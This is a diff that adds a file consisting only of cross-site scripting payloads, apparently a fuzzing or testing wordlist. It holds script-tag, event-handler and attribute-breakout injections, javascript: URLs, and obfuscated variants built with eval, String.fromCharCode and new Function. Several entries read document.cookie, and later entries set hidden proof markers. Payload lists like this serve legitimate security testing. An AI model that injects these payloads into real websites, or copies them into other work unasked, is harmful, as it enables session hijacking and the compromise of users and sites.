@@ -1,0 +1,160 @@
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<svg onload=alert('XSS')>
+<svg onload=alert(document.domain)>
+<svg onload=console.log(document.cookie)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=console.log(document.cookie)>
+"<img src=x onerror=alert('XSS')>
+'"><img src=x onerror=alert('XSS')>
+"><svg/onload=alert('XSS')>
+'><svg/onload=alert(document.domain)>
+"><input autofocus onfocus=alert('XSS')>
+" onmouseover="alert('XSS')" autofocus=
+" onfocus="alert(document.domain)" autofocus=
+onerror=alert('XSS')
+onerror=alert(document.domain)
+javascript:alert('XSS')
+"><script>alert('XSS')</script>
+');alert('XSS');//
+");alert(document.domain);//
+');console.log(document.cookie);//
+<script>var d='doc'+'ument';alert(window[d].domain)</script>
+<img/src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>
+<div id=out></div><script>document.getElementById('out').innerText=document.cookie</script>
+<iframe srcdoc="<script>alert('XSS')"></iframe>
+'><img src=x onerror=console.log(document.cookie)>
+"><a href="javascript:alert('XSS')">click</a>
+<script>alert('XSS')</script>
+<svg onload=alert('XSS')>
+<img src=x onerror=alert('XSS')>
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(document.domain)>
+<script>alert(document.cookie)</script>
+<img src=x onerror=console.log(document.cookie)>
+"><svg/onload=alert('XSS')>
+" onfocus="alert('XSS')" autofocus="
+" onmouseover="alert(document.domain)" autofocus="
+"><input autofocus onfocus=alert('XSS')>
+' onfocus='alert("XSS")' autofocus='
+'><input autofocus onfocus=alert("XSS")>
+');alert('XSS');//
+");alert('XSS');//
+');alert(document.domain);// 
+");alert(document.domain);//
+');console.log(document.cookie);// 
+");console.log(document.cookie);//
+javascript:alert('XSS')
+"><a href="javascript:alert('XSS')">click</a>
+onerror=alert('XSS')
+onerror=alert(document.domain)
+onerror=console.log(document.cookie)
+<div id=out></div><script>document.getElementById('out').innerText=document.domain</script>
+<div id=out></div><script>document.getElementById('out').innerText=document.cookie</script>
+<script>console.log(document.cookie)</script>
+<script>eval('al'+'ert("XSS")')</script>
+<svg onload="(()=>{alert('XSS')})()"></svg>
+<img src=x onerror="(function(){alert(document.domain)})()">
+<svg><foreignObject><body onload="alert('XSS')"></body></foreignObject></svg>
+<svg><script><![CDATA[alert('XSS')]]></script></svg>
+<img src=x onerror="setTimeout(()=>alert('XSS'),0)">
+<iframe srcdoc="<svg onload=alert('XSS')></svg>"></iframe>
+<img srcset="x 1x, x 2x" onerror="alert('XSS')">
+<svg onload="var s='do'+'main';alert(document[s])"></svg>
+<script>var a=[100,88,83,83];alert(String.fromCharCode.apply(null,a))</script>
+<img src=x onerror="alert(String.fromCharCode(100,111,109,97,105,110))">
+<svg onload="(new Function('alert(document.domain)'))()"></svg>
+<body onpageshow="alert('XSS')"></body>
+<video onerror="alert('XSS')"></video>
+<math><maction actiontype="statusline" xlink:href="#" onload="alert('XSS')"></maction></math>
+<div id=x></div><script>document.getElementById('x').innerText=location.hostname</script>
+<svg><g onload="console.log(document.cookie)"></g></svg>
+<img src=x onerror="document.body.appendChild(document.createTextNode(document.domain))">
+<svg onload="document.body.appendChild(document.createTextNode('XSS:'+location.hostname))"></svg>
+<div id=o></div><script>document.getElementById('o').textContent=String.fromCharCode(88,83,83)</script>
+<script>console.log('XSS_EXECUTED')</script>
+
+<script>void(console.log('XSS_EXECUTED'))</script>
+
+<script>document.body.dataset.xss='true'</script>
+
+<script>var e=document.createElement('div');e.id='xss-proof';e.style.display='none';document.body.appendChild(e)</script>
+
+<script>document.documentElement.setAttribute('data-xss','1')</script>
+
+<script>void((function(){document.body.appendChild(Object.assign(document.createElement('i'),{id:'xss-hidden',style:'display:none'}))})())</script>
+
+<svg onload="console.log('XSS_EXECUTED')"></svg>
+
+<svg onload="(function(){document.body.dataset.spoof='xss'})()"></svg>
+
+<img src=x onerror="console.log('XSS_EXECUTED')">
+
+<img src=x onerror="(function(){var n=document.createElement('span');n.id='xss-hidden-span';n.style.display='none';document.body.appendChild(n)})()">
+
+<svg onload="var a=document.createElement('meta');a.name='xss-proof';a.content='1';document.head.appendChild(a)"></svg>
+
+<iframe srcdoc="<script>document.body.dataset.ifr='xss'</script>"></iframe>
+
+<div id=out style="display:none"></div><script>document.getElementById('out').dataset.p='xss'</script>
+
+<script>performance.mark('xss-executed-'+Date.now())</script>
+
+<script>window.__xss_executed = (window.__xss_executed||0)+1</script>
+
+<img src=x onerror="(new Function('document.body.dataset.errX=\"1\"'))()">
+
+"><input autofocus onfocus="document.body.dataset.attrFocus='xss'" autofocus>
+
+');void(console.log('XSS_EXECUTED'));//
+
+");void(document.body.dataset.jsString='xss');//
+
+onerror=void(console.log('XSS_EXECUTED'))
+<script>eval('al'+'ert("XSS")')</script>
+<script>var _='al'+'ert';window[_]('XSS')</script>
+<script>new Function('alert("XSS")')()</script>
+<script>setTimeout(function(){alert('XSS')},0)</script>
+<script>var s=String.fromCharCode;alert(s(88,83,83))</script>
+<script>alert(String.fromCharCode(100,111,109,97,105,110))</script>
+
+<svg onload="(function(){alert('XSS')})()"></svg>
+<svg onload="var d='do'+'main';alert(document[d])"></svg>
+<svg onload="(new Function('alert(document.domain)'))()"></svg>
+<svg><script><![CDATA[alert('XSS')]]></script></svg>
+<svg onload="var s=String.fromCharCode;alert(s(100,111,109,97,105,110))"></svg>
+
+<img src=x onerror="(function(){alert('XSS')})()">
+<img src=x onerror="var s='al'+'ert';this[s]('XSS')">
+<img src=x onerror="alert(String.fromCharCode(100,111,109,97,105,110))">
+<img src=x onerror="setTimeout(()=>alert(document.domain),0)">
+
+<iframe srcdoc="<svg onload=alert('XSS')></svg>"></iframe>
+<iframe srcdoc="<script>console.log('XSS')</script>"></iframe>
+
+<div id=o></div><script>document.getElementById('o').textContent=String.fromCharCode(88,83,83)</script>
+<div id=o></div><script>document.getElementById('o').innerText=location.hostname</script>
+<div id=o></div><script>document.getElementById('o').appendChild(document.createTextNode('XSS:'+location.hostname))</script>
+
+<body onpageshow="(function(){alert('XSS')})()"></body>
+<body onload="console.log(document.domain)"></body>
+
+<input autofocus onfocus="(new Function('alert(document.domain)'))()">
+<input autofocus onfocus="var s='do'+'main';alert(document[s])">
+
+"><svg/onload=eval('al'+'ert(\\'XSS\\')')>
+'"><img/src=x onerror=alert(String.fromCharCode(88,83,83))>
+"><input autofocus onfocus=alert(String.fromCharCode(100,111,109,97,105,110))>
+
+<math><maction actiontype="statusline" xlink:href="#" onload="alert('XSS')"></maction></math>
+
+<img srcset="x 1x, x 2x" onerror="(new Function('alert(document.domain)'))()">
+
+<script>var a=[97,108,101,114,116,40,34,88,83,83,34,41];eval(String.fromCharCode.apply(null,a))</script>
+
+<svg onload="(function(){console.log(document.cookie)})();"></svg>
+
+<img src=x onerror="document.body.appendChild(document.createTextNode('HOST:'+location.hostname))">
+
